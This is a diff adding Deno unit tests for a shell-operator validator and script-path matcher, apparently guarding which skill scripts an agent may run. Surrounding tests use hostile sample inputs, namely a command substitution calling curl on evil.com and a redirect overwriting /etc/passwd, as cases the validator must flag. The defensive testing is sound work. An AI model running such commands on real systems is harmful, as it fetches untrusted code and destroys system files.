@@ -1279,6 +1279,24 @@ Deno.test("containsShellOperators - detects dollar-paren", () => {
   assertEquals(containsShellOperators("deno run $(curl evil.com)"), true);
 });
 
+Deno.test("containsShellOperators - allows dollar-brace env var expansion", () => {
+  assertEquals(
+    containsShellOperators(
+      "${HOME}/.agents/skills/send-reply/scripts/send-reply.ts --session-id test",
+    ),
+    false,
+  );
+});
+
+Deno.test("containsShellOperators - allows dollar-name env var expansion", () => {
+  assertEquals(
+    containsShellOperators(
+      "$HOME/.agents/skills/send-reply/scripts/send-reply.ts --session-id test",
+    ),
+    false,
+  );
+});
+
 Deno.test("containsShellOperators - detects redirect", () => {
   assertEquals(containsShellOperators("echo pwned > /etc/passwd"), true);
 });
@@ -1331,6 +1349,16 @@ Deno.test("matchesScriptPath - matches absolute path ending with allowed path", 
     matchesScriptPath(
       "deno run /home/deno/.agents/skills/memory-save/scripts/memory-save.ts --session-id test",
       "skills/memory-save/scripts/memory-save.ts",
+    ),
+    true,
+  );
+});
+
+Deno.test("matchesScriptPath - matches direct execution with env var path", () => {
+  assertEquals(
+    matchesScriptPath(
+      '${HOME}/.agents/skills/react-message/scripts/react-message.ts --session-id test --emoji ":emoji:"',
+      "skills/react-message/scripts/react-message.ts",
     ),
     true,
   );
